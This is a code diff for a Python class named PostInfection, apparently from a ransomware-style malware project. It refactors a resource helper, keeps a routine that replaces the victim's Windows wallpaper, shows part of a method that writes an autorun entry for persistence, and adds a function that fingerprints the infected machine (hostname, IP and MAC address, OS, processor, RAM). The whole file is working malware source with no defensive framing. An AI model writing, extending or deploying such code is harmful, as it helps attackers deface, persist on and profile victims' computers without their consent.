@@ -2,31 +2,17 @@ import os
 import ctypes
 from shutil import copyfile
 
+from utils import resourcePath
 class PostInfection(object):
 
     def __init__(self):
         print("PostInfection Object Created")
-        self.logo = self.resource_path(["images"],"logo.png")
-        self.wallpaper = self.resource_path(["images"],"wallpaper.png")   
-        print("Logo :", self.logo)
-        print("Wallpaper :", self.wallpaper)
-
-    def resource_path(self, folders, filename):
-        """ Get absolute path to resource, works for dev and for PyInstaller """
-        try:
-            # PyInstaller creates a temp folder and stores path in _MEIPASS
-            base_path = sys._MEIPASS
-        except Exception:
-            base_path = os.path.abspath(".")
-
-        for fol in folders:
-            base_path = os.path.join(base_path,fol)
-
-        return os.path.join(base_path, filename) 
+        self.wallpaper_path = resourcePath("wallpaper.png",["images"])   
+        print("Wallpaper :", self.wallpaper_path)
     
     def changeWallpaper(self):
 
-        _status = ctypes.windll.user32.SystemParametersInfoW(0x14, 0, self.wallpaper, 0x2)
+        _status = ctypes.windll.user32.SystemParametersInfoW(0x14, 0, self.wallpaper_path, 0x2)
         if _status:
             print("Wallpaper has been changed")
         else:
@@ -53,3 +39,23 @@ class PostInfection(object):
         with open(_autorun_file_path,"w") as autorunfile:
             autorunfile.write(keyspath)
 
+    def getSystemInfo(self):
+        import platform,socket,re,uuid,psutil
+        try:
+            info={}
+            info['platform']=platform.system()
+            info['platform-release']=platform.release()
+            info['platform-version']=platform.version()
+            info['architecture']=platform.machine()
+            info['hostname']=socket.gethostname()
+            info['ip-address']=socket.gethostbyname(socket.gethostname())
+            info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
+            info['processor']=platform.processor()
+            info['ram']=str(round(psutil.virtual_memory().total / (1024.0**3)))+" GB"
+            return info
+        except Exception as e:
+            print("Problem Has Been Occured When Information Gathering")
+
+
+pi = PostInfection()
+print(pi.getSystemInfo())
